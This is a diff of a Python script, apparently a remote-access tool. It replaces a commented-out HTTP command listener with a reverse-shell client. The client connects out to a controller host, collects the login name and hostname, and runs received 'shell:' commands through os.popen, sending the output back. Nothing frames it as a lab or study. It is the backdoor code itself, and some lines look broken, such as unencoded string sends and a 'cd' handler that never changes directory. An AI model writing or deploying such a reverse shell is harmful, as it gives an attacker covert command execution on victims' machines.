@@ -7,59 +7,63 @@ import os
 import socket
 import requests
 import urllib
+import platform
 
 
-'''
-    def server():
-        conn = http_socket
-
-        client_message = conn.makefile().readline()
-        
-        try:
-            requests_url: str = client_message[client_message.index(" ")+1:client_message.rfind("H")-1]
-            requests_url: str = requests_url.strip()
-            requests_url: str = urllib.parse.unquote(requests_url)
-
-            print(requests_url)
-
-            if requests_url.startswith("/shell "):
-                shell: str = requests_url[requests_url.index("/shell ")+len("/shell ") : len(requests_url)]
-                
-                if shell.startswith("cd "):
-                    cd_path = shell[3:len(shell)]
-                    cd_path = cd_path.strip()
-                    os.chdir(cd_path)
-
-                run = os.popen(shell)
-                conn.send(bytes(run.read().encode()))
-                conn.close()
-            
-            else:
-                conn.send(bytes("command error".encode()))
-                conn.close()
-
-        except:
-            conn.send(bytes("error".encode()))
-            conn.close()
-'''
-
+run_path: str = os.getcwd()
 
 def socket_service():
     #print(" [INFO] START HTTP SEVICE ON PORT: "+str(port))
-    http_socket = socket.socket()
+    http_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     http_socket.connect((connect,port))
 
     #http_socket.send(bytes("GET /?api_key HTTP/1.1".encode()))
+    http_socket.send("ok".encode())
     while True:
         try:
-            client_message = http_socket.makefile().readline()
+            ret = http_socket.recv(1024)
+            client_message = ret.decode("utf-8")
             client_message = client_message.replace("\n","")
+            client_message = client_message.strip()
 
-            if not client_message:
+            if client_message == 'exit':
+                http_socket.close()
+                exit(0)
                 break
-            if client_message
+
+            if client_message == 'getinfo':
+                os_name = os.name
+                os_login = os.getlogin()
+                host_name = socket.gethostname()
+
+
+            if client_message.startswith("shell:"):
+                shell: str = client_message[client_message.index("shell:")+6:len(client_message)]
+                shell: str = shell.strip()
+                print(shell)
+                if shell.startswith("cd "):
+                    cd_path = shell[3:len(shell)]
+                    cd_path = cd_path.strip()
+                    print(cd_path)
+                    try:
+                        if os.path.exists(cd_path) and os.path.isdir(cd_path):
+                            http_socket.send("cd: "+cd_path+" successful!")
+                        else:
+                            http_socket.send("cd: "+cd_path+" error!")
+                    except:
+                        http_socket.send("cd: "+cd_path+" error!")
+                    continue
+                else:
+                    run = os.popen("cd "+run_path+" & "+shell,"r")
+                    run_result = run.read()
+                    http_socket.send(bytes(run_result.encode()))
+
+            else:
+                http_socket.send(bytes("send command error".encode()))
+
+                
         except:
-            break
+            http_socket.send("send command error".encode())
 
 
 if __name__ == '__main__':
